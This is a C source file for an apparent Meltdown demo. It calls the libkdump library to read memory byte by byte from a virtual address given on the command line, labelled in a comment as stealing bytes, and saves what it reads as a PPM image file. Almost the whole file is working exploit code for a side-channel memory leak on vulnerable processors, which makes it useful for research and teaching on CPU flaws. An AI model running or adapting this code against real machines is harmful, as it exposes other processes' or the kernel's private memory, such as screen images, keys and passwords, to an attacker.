#include "libkdump.h"
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>

typedef struct {
     unsigned char red,green,blue;
} PPMPixel;

typedef struct {
     int x, y;
     PPMPixel *data;
} PPMImage;

#define CREATOR "RPFELGUEIRAS"
#define RGB_COMPONENT_COLOR 255

void writePPM(const char *filename, PPMImage *img)
{
  FILE *fp;
  //open file for output
  fp = fopen(filename, "wb");
  if (!fp) {
    fprintf(stderr, "Unable to open file '%s'\n", filename);
    exit(1);
  }

  //write the header file
  //image format
  fprintf(fp, "P6\n");

  //comments
  fprintf(fp, "# Created by %s\n",CREATOR);

  //image size
  fprintf(fp, "%d %d\n",img->x,img->y);

  // rgb component depth
  fprintf(fp, "%d\n",RGB_COMPONENT_COLOR);

  // pixel data
  fwrite(img->data, 3 * img->x, img->y, fp);
  fclose(fp);
}

int main(int argc, char** argv){

  if(argc!=3){
    printf("Usage: sudo ./mydemo OFFSET START-VIRTURAL-ADDRESS\n");
  }

  libkdump_config_t config;
  config = libkdump_get_autoconfig();
  config.physical_offset = strtoull(argv[1], NULL, 0);
  libkdump_init(config);

  PPMImage *image = (PPMImage*)malloc(sizeof(PPMImage));
  printf("Input x y:");
  int width, height;
  scanf("%d %d", &width, &height);

  image->x = width;
  image->y = height;
  image->data = (PPMPixel*)malloc(image->x*image->y*sizeof(PPMPixel));
  memset(image->data, RGB_COMPONENT_COLOR, image->x*image->y*sizeof(PPMPixel));

  //writePPM("test_res_0.ppm", image);

  size_t vaddr_start = strtoull(argv[2], NULL, 0);
  printf("\x1b[32;1m[+]\x1b[0m Virtural addree starts at : \x1b[33;1m%zx\x1b[0m\n", vaddr_start);
  int i,j;
  for(i=0;i<image->x*image->y;i++){
    // steal 3 bytes
    unsigned char red_val = libkdump_read(vaddr_start+i*3);
    unsigned char green_val = libkdump_read(vaddr_start+i*3+1);
    unsigned char blue_val = libkdump_read(vaddr_start+i*3+2);
    image->data[i].red = red_val;
    image->data[i].green = green_val;
    image->data[i].blue = blue_val;
    if(i%(512*10)==0){
      writePPM("result.ppm", image);
    }
  }
  writePPM("result.ppm", image);
  printf("\x1b[32;1m[+]\x1b[0m Done.\n");
  libkdump_cleanup();
  return 0;
}
